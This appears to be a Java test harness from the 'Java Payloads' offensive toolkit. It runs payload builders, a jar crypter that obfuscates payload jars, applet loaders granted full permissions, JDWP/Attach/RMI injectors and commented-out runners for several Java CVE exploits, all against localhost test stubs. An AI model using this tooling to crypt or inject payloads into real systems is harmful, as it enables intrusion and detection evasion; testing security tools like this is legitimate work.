/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.test;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javapayload.Module;
import javapayload.builder.AppletJarBuilder;
import javapayload.builder.ClassBuilder;
import javapayload.builder.CryptedJarBuilder;
import javapayload.builder.EmbeddedAppletJarBuilder;
import javapayload.builder.EmbeddedClassBuilder;
import javapayload.builder.EmbeddedJarBuilder;
import javapayload.builder.JarBuilder;
import javapayload.builder.RMIInjector;
import javapayload.builder.SpawnTemplate;
import javapayload.crypter.Agent;
import javapayload.crypter.JarLayout;
import javapayload.crypter.MainClass;
import javapayload.crypter.SignedApplet;
import javapayload.handler.stage.TestStub;
import javapayload.handler.stager.StagerHandler;
import javapayload.stage.StageMenu;
import javapayload.stage.StreamForwarder;

public class BuilderTest {

	public static void main(String[] args) throws Exception {
		System.out.println("Testing builders...");
		String[] stagers = StagerTest.getStagers();
		BuilderTestRunner[] runners = new BuilderTestRunner[] {
				new ClassBuilderTestRunner(),
				new EmbeddedClassBuilderTestRunner(),
				new JarBuilderTestRunner(),
				new StripJarBuilderTestRunner(),
				new JarCrypterTestRunner(new StripJarBuilderTestRunner(), "stripped.jar", new MainClass(), new String[] {"StaLo"}),
				new EmbeddedJarBuilderTestRunner(),
				new StripEmbeddedJarBuilderTestRunner(),
				new LocalStageJarBuilderTestRunner(),
				new JarCrypterTestRunner(new LocalStageJarBuilderTestRunner(), "LocalStage.jar", new MainClass(), new String[] {"StaLo"}),
				/* #JDK1.5 */new BuilderTest15.AgentJarBuilderTestRunner(), /**/
				/* #JDK1.5 */new JarCrypterTestRunner(new BuilderTest15.AgentJarBuilderTestRunner(), "Agent_*.jar", new Agent(), new String[0]), /**/
				new AppletJarBuilderTestRunner(),
				new NewNameAppletJarBuilderTestRunner(),
				new EmbeddedAppletJarBuilderTestRunner(),
				new JarCrypterTestRunner(new EmbeddedAppletJarBuilderTestRunner(), "EmbeddedAppletJar.jar", new SignedApplet(), new String[] {"javapayload.loader.AppletLoader", "AppLo"}),
				new EmbeddedNewNameAppletJarBuilderTestRunner(),
				// /* #JDK1.4 */new BuilderTest14.CVE_2008_5353TestRunner(), /**/
				// /* #JDK1.4 */new BuilderTest14.EmbeddedCVE_2008_5353TestRunner(), /**/
				// /* #JDK1.5 */new BuilderTest15.CVE_2010_0094TestRunner(), /**/
				// /* #JDK1.5 */new BuilderTest15.CVE_2010_4465TestRunner(), /**/
				// new CVE_2010_0840TestRunner(),
				/* #JDK1.6 */new BuilderTest16.AttachInjectorTestRunner(), /**/
				/* #JDK1.3 */new BuilderTest13.JDWPInjectorTestRunner(), /**/
				new RMIInjectorTestRunner(),
				//new JarCrypterTestRunner(new RMIInjectorTestRunner(), "rmitest.jar", new javapayload.crypter.RMI(), new String[] {"javapayload.loader.rmi.LoaderImpl", "RMILDR"}),
		};
		for (int i = 0; i < runners.length; i++) {
			BuilderTestRunner runner = runners[i];
			System.out.println("\t" + runner.getName());
			for (int j = 0; j < stagers.length; j++) {
				String name = stagers[j];
				System.out.println("\t\t" + name);
				String[] testArgs = StagerTest.getTestArgs(name);
				if (testArgs == null)
					continue;
				for (int k = 0; k < testArgs.length; k++) {
					System.out.println("\t\t\t" + testArgs[k]);
					testBuilder(runner, name, testArgs[k]);
				}
			}
			runner.cleanup();
		}
		System.out.println("Builder tests finished.");
		new ThreadWatchdogThread(5000).start();
	}

	protected static void testBuilder(final BuilderTestRunner runner, String name, String testArgs) throws Exception {
		String realName = name;
		if (runner.getName().indexOf('_') != -1 && !runner.getName().startsWith("CVE_")) {
			realName = runner.getName().substring(0, runner.getName().indexOf('_')+1) + name;
			if (name.equals("BindMultiTCP") || name.startsWith("Integrated$") || name.startsWith("Spawn_"))
				return;
		}
		if (runner.getName().indexOf("Embedded") == -1 && runner.getName().indexOf("Injector") == -1 && name.indexOf("Integrated$") != -1) 
			return;
		final String[] args = StageMenu.splitArgs(realName + " " + testArgs + " -- TestStub");
		final StagerHandler.Loader loader = (runner.getName().indexOf("Injector") != -1) ? null : new StagerHandler.Loader(args);
		if (runner.getName().indexOf("[kill]") != -1) {
			if (name.startsWith("Spawn"))
				return;
			((TestStub) loader.stageHandler).sendExit = true;
		}
		if (loader != null)
			loader.handleBefore(System.err, null);
		runner.runBuilder(loader == null ? args : loader.getArgs());
		final Throwable[] tt = new Throwable[1];
		Thread t = new Thread(new Runnable() {
			public void run() {
				try {
					runner.runResult(loader == null ? args : loader.getArgs());
				} catch (Throwable t) {
					tt[0] = t;
				}
			};
		});
		t.start();
		runner.waitReady();
		if (loader != null)
			loader.handleAfter(System.err, null);
		t.join();
		if (tt[0] != null) {			
			/* #JDK1.4 */try {
				throw new Exception("Builder result died", tt[0]);
			} catch (NoSuchMethodError ex2) /**/{
				throw new Exception("Builder result died: " + tt[0].toString());
			}
		}
	}
	
	public static void runJavaAndWait(WaitingBuilderTestRunner runner, String classpath, String jvmarg, String mainClass, String[] args) throws Exception {
		Process proc = runJava(classpath, jvmarg, mainClass, args);
		new StreamForwarder(proc.getErrorStream(), System.err, System.err, false).start();
		proc.getInputStream().read();
		runner.notifyReady();
		if (proc.waitFor() != 0)
			throw new IOException("Build result exited with error code " + proc.exitValue());
	}

	public static Process runJava(String classpath, String jvmarg, String mainClass, String[] args) throws IOException {
		List commands = new ArrayList();
		commands.add(SpawnTemplate.getJreExecutable("java"));
		commands.add("-classpath");
		commands.add(classpath + System.getProperty("javapayload.child.classpath", ""));
		if (System.getProperty("net.sourceforge.cobertura.datafile") != null) {
			commands.add("-Dnet.sourceforge.cobertura.datafile=" + System.getProperty("net.sourceforge.cobertura.datafile").replace('1', '2'));
		}
		if (jvmarg != null)
			commands.add(jvmarg);
		commands.add(mainClass);
		commands.addAll(Arrays.asList(args));
		String[] commandArgs = (String[]) commands.toArray(new String[commands.size()]);
		Process proc = Runtime.getRuntime().exec(commandArgs);
		return proc;
	}

	public static void runAppletAndWait(final WaitingBuilderTestRunner runner, String archive, String className, String policyfile, String[] args) throws Exception {
		runAppletAndWait(runner, archive, className, policyfile, args, null);
	}
	
	public static void runAppletAndWait(final WaitingBuilderTestRunner runner, String archive, String className, String policyfile, String[] args, ServerSocket notifierForEmbedded) throws Exception {
		final ServerSocket ss = notifierForEmbedded != null ? notifierForEmbedded : new ServerSocket(0);
		new Thread(new Runnable() {
			public void run() {
				try {
					Socket s = ss.accept();
					s.getOutputStream().write("HTTP/1.1 200 ok\r\n\r\n".getBytes());
					ss.close();
					s.close();
					runner.notifyReady();
				} catch (Throwable t) {
					t.printStackTrace();
				}
			}
		}).start();
		FileWriter fw = new FileWriter("applettest.html");
		String childClassPath = System.getProperty("javapayload.child.classpath", "");
		if (childClassPath.startsWith(";")) {
			childClassPath=",file:///"+childClassPath.substring(1);
		}
		fw.write("<applet archive=\"" + archive + childClassPath + "\" code=\"" + className + "\" width=\"100\" height=\"100\">\r\n");
		if (notifierForEmbedded == null) {
			fw.write("		<param name=\"readyURL\" value=\"http://localhost:" + ss.getLocalPort() + "/foo\">\r\n" +
					"		<param name=\"argc\" value=\"" + args.length + "\">\r\n");
			for (int i = 0; i < args.length; i++) {
				fw.write("		<param name=\"arg" + i + "\" value=\"" + args[i] + "\" />\r\n");
			}
		}
		fw.write("		</applet></tt></p>");
		fw.close();
		List commands = new ArrayList();
		commands.add(System.getProperty("javapayload.vulnerable.jdk") + "\\bin\\appletviewer");
		if (System.getProperty("net.sourceforge.cobertura.datafile") != null) {
			commands.add("-J-Dnet.sourceforge.cobertura.datafile=" + System.getProperty("net.sourceforge.cobertura.datafile").replace('1', '2'));
		}
		if (policyfile != null) {
			fw = new FileWriter("applettest.policy");
			fw.write(policyfile);
			fw.close();
			commands.add("-J-Djava.security.policy=applettest.policy");
		}
		commands.add("applettest.html");
		String[] commandArgs = (String[]) commands.toArray(new String[commands.size()]);
		Process proc = Runtime.getRuntime().exec(commandArgs);
		new StreamForwarder(proc.getErrorStream(), System.err, System.err, false).start();
		if (proc.waitFor() != 0)
			throw new IOException("Build result exited with error code " + proc.exitValue());
	}

	public static interface BuilderTestRunner {
		String getName();
		void waitReady() throws InterruptedException;
		void runBuilder(String[] args) throws Exception;
		void runResult(String[] args) throws Exception;
		void cleanup() throws Exception;
	}
	
	public static class JarCrypterTestRunner implements BuilderTestRunner {
		private final BuilderTestRunner runner;
		private final String jarName;
		private final JarLayout jarLayout;
		private final String[] layoutArgs;

		public JarCrypterTestRunner(BuilderTestRunner runner, String jarName, JarLayout jarLayout, String[] layoutArgs) {
			this.runner = runner;
			this.jarName = jarName;
			this.jarLayout = jarLayout;
			this.layoutArgs = layoutArgs;
			try {
				Field f = runner.getClass().getField("loaderName");
				if (layoutArgs.length > 0)
					f.set(runner, layoutArgs[layoutArgs.length-1]);
			} catch (Exception ex) {
			}
		}

		public String getName() {
			return runner.getName()+" + JarCrypter";
		}

		public void waitReady() throws InterruptedException {
			runner.waitReady();
		}

		public void runBuilder(String[] args) throws Exception {
			runner.runBuilder(args);
			String jarName = this.jarName;
			if (jarName.contains("*"))
				jarName = Module.replaceString(jarName, "*", args[0]);
			new File(jarName).renameTo(new File("uncrypted.jar"));
			String[] crypterArgs = new String[] {
					"uncrypted.jar",
					jarName,
					"RnR",
					"HashNames",
					jarLayout.getName(),
			};
			if (layoutArgs.length > 0) {
				String[] tmp = crypterArgs;
				crypterArgs = new String[tmp.length+layoutArgs.length];
				System.arraycopy(tmp, 0, crypterArgs, 0, tmp.length);
				System.arraycopy(layoutArgs, 0, crypterArgs, tmp.length, layoutArgs.length);
			}
			new CryptedJarBuilder().build(crypterArgs);
			if (!new File("uncrypted.jar").delete()) 
				throw new IOException("Unable to delete file");
		}

		public void runResult(String[] args) throws Exception {
			runner.runResult(args);
		}

		public void cleanup() throws Exception {
			runner.cleanup();
		}
	}
	
	public static abstract class WaitingBuilderTestRunner implements BuilderTestRunner {
		private boolean ready = false;
		
		public synchronized void notifyReady() {
			ready = true;
			notifyAll();
		}
		
		public synchronized void waitReady() throws InterruptedException {
			while (!ready)
				wait();
		}
	}

	public static class ClassBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "ClassBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			ClassBuilder.main(new String[] { args[0], "BuilderTestClass" });
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, ".", null, "BuilderTestClass", a);
		}

		public void cleanup() throws Exception {
			if (!new File("BuilderTestClass.class").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class EmbeddedClassBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "EmbeddedClassBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			List builderArgs = new ArrayList();
			builderArgs.add("BuilderTestClass");
			builderArgs.addAll(Arrays.asList(args));
			EmbeddedClassBuilder.main((String[]) builderArgs.toArray(new String[builderArgs.size()]));
		}

		public void runResult(String[] args) throws Exception {
			runJavaAndWait(this, ".", null, "BuilderTestClass", new String[] {"+"});
		}
		
		public void cleanup() throws Exception {
			if (!new File("BuilderTestClass.class").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class JarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "JarBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			JarBuilder.main(new String[] { args[0] });
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, args[0] + ".jar", null, "javapayload.loader.StandaloneLoader", a);
			if (!new File(args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}

		public void cleanup() throws Exception {
		}
	}
	
	public static class StripJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String loaderName = "javapayload.loader.StandaloneLoader";
	
		public String getName() { return "JarBuilder (stripped)"; }

		public void runBuilder(String[] args) throws Exception {
			JarBuilder.main(new String[] { "--strip", "stripped.jar", args[0] });
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, "stripped.jar", null, loaderName, a);
		}

		public void cleanup() throws Exception {
			if (!new File("stripped.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}

	public static class EmbeddedJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "EmbeddedJarBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			EmbeddedJarBuilder.main(args);
		}

		public void runResult(String[] args) throws Exception {
			runJavaAndWait(this, "embedded.jar", null, "javapayload.loader.EmbeddedJarLoader", new String[] {"+"});
		}

		public void cleanup() throws Exception {
			if (!new File("embedded.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class StripEmbeddedJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "EmbeddedJarBuilder (stripped)"; }

		public void runBuilder(String[] args) throws Exception {
			String[] newArgs = new String[args.length+2];
			newArgs[0] = "--strip";
			newArgs[1] = "embstrip.jar";
			System.arraycopy(args, 0, newArgs, 2, args.length);
			EmbeddedJarBuilder.main(newArgs);
		}

		public void runResult(String[] args) throws Exception {
			runJavaAndWait(this, "embstrip.jar", null, "javapayload.loader.EmbeddedJarLoader", new String[] {"+"});
		}

		public void cleanup() throws Exception {
			if (!new File("embstrip.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class LocalStageJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String loaderName = "javapayload.loader.StandaloneLoader";
		
		public String getName() { return "LocalStage_JarBuilder"; }

		public void runBuilder(String[] args) throws Exception {
			JarBuilder.main(new String[] {"LocalStage.jar", args[0], "--", "TestStub"});
		}

		public void runResult(String[] args) throws Exception {
			String[] a = (String[])args.clone();
			a[0] = "+" + a[0];
			runJavaAndWait(this, "LocalStage.jar", null, loaderName, a);
		}

		public void cleanup() throws Exception {
			if (!new File("LocalStage.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
	

	public static class AppletJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String getName() { return "AppletJarBuilder [kill]";	}

		public void runBuilder(String[] args) throws Exception {
			AppletJarBuilder.main(new String[] { args[0] });
		}

		public void runResult(String[] args) throws Exception {
			runAppletAndWait(this, "Applet_" + args[0] + ".jar", "javapayload.loader.AppletLoader", "grant { permission java.security.AllPermission; };", args);
			if (!new File("Applet_" + args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}

		public void cleanup() throws Exception {
			if (!new File("applettest.html").delete())
				throw new IOException("Unable to delete file");
			if (!new File("applettest.policy").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class NewNameAppletJarBuilderTestRunner extends AppletJarBuilderTestRunner {
		public String getName() { return "NewNameAppletJarBuilder [kill]";	}

		public void runBuilder(String[] args) throws Exception {
			AppletJarBuilder.main(new String[] { "--name", "some.funny.ClassName", args[0] });
		}

		public void runResult(String[] args) throws Exception {
			runAppletAndWait(this, "Applet_" + args[0] + ".jar", "some.funny.ClassName", "grant { permission java.security.AllPermission; };", args);
			if (!new File("Applet_" + args[0] + ".jar").delete())
				throw new IOException("Unable to delete file");
		}		
	}

	public static class EmbeddedAppletJarBuilderTestRunner extends WaitingBuilderTestRunner {
		public String loaderName = "javapayload.loader.AppletLoader";

		public String getName() { return "EmbeddedAppletJarBuilder [kill]";	}

		private ServerSocket ss;

		public void runBuilder(String[] args) throws Exception {
			ss = new ServerSocket(0);
			String[] builderArgs = new String[args.length+2];
			builderArgs[0] = "--readyURL";
			builderArgs[1] = "http://localhost:" + ss.getLocalPort() + "/foo";
			System.arraycopy(args, 0, builderArgs, 2, args.length);
			new EmbeddedAppletJarBuilder().build(builderArgs);
		}

		public void runResult(String[] args) throws Exception {
			runAppletAndWait(this, "EmbeddedAppletJar.jar", loaderName, "grant { permission java.security.AllPermission; };", null, ss);
			ss = null;
			if (!new File("EmbeddedAppletJar.jar").delete())
				throw new IOException("Unable to delete file");
		}

		public void cleanup() throws Exception {
			if (!new File("applettest.html").delete())
				throw new IOException("Unable to delete file");
			if (!new File("applettest.policy").delete())
				throw new IOException("Unable to delete file");
		}
	}
	
	public static class EmbeddedNewNameAppletJarBuilderTestRunner extends AppletJarBuilderTestRunner {
		public String getName() { return "EmbeddedNewNameAppletJarBuilder [kill]";	}

		private ServerSocket ss;

		public void runBuilder(String[] args) throws Exception {
			ss = new ServerSocket(0);
			String[] builderArgs = new String[args.length+7];
			builderArgs[0] = "--builder";
			builderArgs[1] = "AppletJar";
			builderArgs[2] = "--readyURL";
			builderArgs[3] = "http://localhost:" + ss.getLocalPort() + "/foo";
			builderArgs[4] = "--name";
			builderArgs[5] = "some.funny.ClassName";
			builderArgs[6] = "funny.jar";
			System.arraycopy(args, 0, builderArgs, 7, args.length);
			new EmbeddedAppletJarBuilder().build(builderArgs);
		}

		public void runResult(String[] args) throws Exception {
			runAppletAndWait(this, "funny.jar", "some.funny.ClassName", "grant { permission java.security.AllPermission; };", null, ss);
			if (!new File("funny.jar").delete())
				throw new IOException("Unable to delete file");
		}		
	}

	public static class RMIInjectorTestRunner extends WaitingBuilderTestRunner {
		public String loaderName = "";
		
		public String getName() { return "RMIInjector"; }

		public void runBuilder(String[] args) throws Exception {
			RMIInjector.main(new String[] {"-buildjar", "rmitest.jar"});
		}

		public void runResult(String[] args) throws Exception {
			Process proc = runJava(".", null, "sun.rmi.registry.RegistryImpl", new String[] {"10999"});
			String[] injectorArgs = new String[args.length + 3];
			injectorArgs[0] = "file:./rmitest.jar"+(loaderName.length() == 0 ? "" : "^^"+loaderName);
			injectorArgs[1] = "localhost";
			injectorArgs[2] = "10999";
			System.arraycopy(args, 0, injectorArgs, 3, args.length);
			notifyReady();
			RMIInjector.main(injectorArgs);
			proc.destroy();
		}

		public void cleanup() throws Exception {
			System.out.println("\t\tPollingTunnel");
			testBuilder(this, "PollingTunnel", "");
			if (!new File("rmitest.jar").delete())
				throw new IOException("Unable to delete file");
		}
	}
}
